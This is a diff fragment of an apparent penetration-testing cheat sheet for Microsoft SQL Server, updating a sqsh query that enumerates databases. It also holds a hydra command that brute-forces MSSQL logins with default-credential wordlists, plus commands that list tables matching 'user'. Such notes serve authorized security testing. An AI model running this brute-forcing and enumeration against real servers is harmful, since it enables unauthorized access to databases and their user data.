@@ -662,7 +662,7 @@ cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefa
 hydra -I mssql://$TARGET -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -e n -t15 2>/dev/null
 
 +---------- Executing Queries ----------+
-sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT name FROM sys.databases;"
+sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -C "EXEC sp_helpdb;" | grep -oP '^name:\s*\K\S+'
 
 DB_NAME="staging"
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'user'
